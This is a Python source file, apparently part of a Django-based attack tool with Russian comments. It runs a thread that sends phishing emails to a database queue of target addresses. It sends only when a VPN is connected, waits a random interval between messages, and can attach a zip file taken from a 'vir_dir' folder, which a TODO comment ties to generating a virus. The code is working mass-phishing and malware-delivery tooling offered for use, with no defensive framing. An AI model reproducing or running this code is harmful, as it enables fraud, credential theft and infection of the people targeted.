import os
import random
import smtplib
from time import sleep
from threading import Thread
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from manager.models.Stack import Stack
from grabber.models.Emails import EmailConfigs
from core.daemon import get_config, set_config, logging

"""
    Проверяет базу на status=0 и запускает процесс атаки в thread.
"""


class Attacking(Thread):

    def __init__(self):
        Thread.__init__(self)

    def run(self):
        if get_config('attacking') == '1':
            return
        set_config('attacking', '1')
        try:
            while True:
                logging('make_an_attack', 'while True')
                stack = Stack.objects.all().filter(status='0')
                stack_count = stack.count()

                if stack_count == 0:
                    set_config('attacking', '0')
                    return
                for email in stack:
                    while True:
                        if get_config('vpn') == '1':
                            logging('make_an_attack', 'vpn==1, break')
                            break
                        else:
                            logging('make_an_attack',
                                    'Не могу подключиться к VPN при атаке почты {0}. Засыпаю в ожиданий'.
                                    format(email.email))
                            sleep(60)
                    logging('make_an_attack', 'vpn==1, breaked')
                    logging('make_an_attack', 'Attacking email: {0}'.format(email.email))
                    result = ''
                    try:
                        eml_prm = EmailConfigs.objects.get(name=email.email.split('@')[1])
                    except EmailConfigs.DoesNotExist:
                        logging('make_an_attack', 'Неизвестный Хост и Порт для {0}'.format(email.email))
                        continue
                    if email.method == '1':
                        result = send_fishing(eml_prm.host, eml_prm.port, email.sender, email.sender_password,
                                              email.email,
                                              email.subject,
                                              email.body)
                    if email.method == '2':
                        the_file = os.getcwd() + '/vir_dir/init.zip'
                        # TODO: Генерация вируса и добавление пути
                        result = send_fishing(eml_prm.host, eml_prm.port, email.sender, email.sender_password,
                                              email.email,
                                              email.subject,
                                              email.body, the_file)
                    if email.method == '3':
                        send_fishing_with_virus()
                    stack_count -= 1
                    logging('make_an_attack', result)
                    if result[0] == 'У':
                        email.status = '1'
                    else:
                        email.status = '4'
                    email.save()
                    sleep(random.randint(30, 120))
                del stack
        except Exception as e:
            logging('make_an_attack EXCEPT', str(e))
        finally:
            set_config('attacking', '0')


def send_fishing(host, port, sender, sender_password, email, subject, body, file=None):
    logging('send_fishing', 'start')
    if file is not None:
        atk_type = 'вируса'
    else:
        atk_type = 'фишинга'
    logging('send_fishing', 'attack type: {0}'.format(atk_type))
    try:
        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'html'))
        logging('send_fishing', 'msg готов')
    except Exception as e:
        logging('send_fishing', 'ExceptionL: {0}, \nпри подготовке msg'.format(e))
        return 'err. Ошибка создания MIMEMultipart при отправке {0} msg: {1}'.format(atk_type, str(e))
    if file is not None:
        file_payload = MIMEBase('application', 'octet-stream')
        with open(file, 'rb') as fl:
            file_payload.set_payload(fl.read())
        fl.close()
        encoders.encode_base64(file_payload)
        file_payload.add_header('Content-Disposition', 'attachment; filename="{0}"'.format(os.path.basename(file)))
        msg.attach(file_payload)
        logging('send_fishing', 'FILE: {0} добавлен в attach'.format(file))
    try:
        session = smtplib.SMTP_SSL(host, int(port))
        logging('send_fishing', 'SMTP_SSL соединение...')
    except Exception as e:
        logging('send_fishing', 'EXCEPTION: SMTP_SSL соединения: {0}'.format(e))
        return 'err. Ошибка подключения к хосту {0} по порту {1} при отправке {2}. Ошибка: {3}'.format(host, port,
                                                                                                       atk_type, str(e))
    # try:
    #     logging('send_fishing', 'starttls...')
    #     session.starttls()
    # except Exception as e:
    #     logging('send_fishing', 'Exception starttls: {0}'.format(e))
    #     return 'err. Ошибка TLS соединения для {0} с паролем {1} при отправке {2}. Ошибка: {3}'.\
    #         format(sender, sender_password, atk_type, str(e))
    try:
        session.login(sender, sender_password)
        logging('send_fishing', 'logining...')
    except Exception as e:
        logging('send_fishing', 'Exception logining: {0}'.format(e))
        return 'err. Ошибка аутентификации для {0} с паролем {1} при отправке {2}. Ошибка: {3}' \
            .format(sender, sender_password, atk_type, str(e))
    try:
        logging('send_fishing', 'sending mail...')
        session.sendmail(sender, email, msg.as_string().encode('utf-8'))
    except Exception as e:
        logging('send_fishing', 'Exception sendmail: {0}'.format(e))
        return 'err. Ошибка при отправке {0} на почту {1}: {2}'.format(atk_type, email, str(e))
    logging('send_fishing', 'quiting')
    session.quit()
    logging('send_fishing', 'finish')
    return 'Успешная отправка {0}: {1}'.format(atk_type, email)


def send_fishing_with_virus():
    pass


def send_vir():
    pass
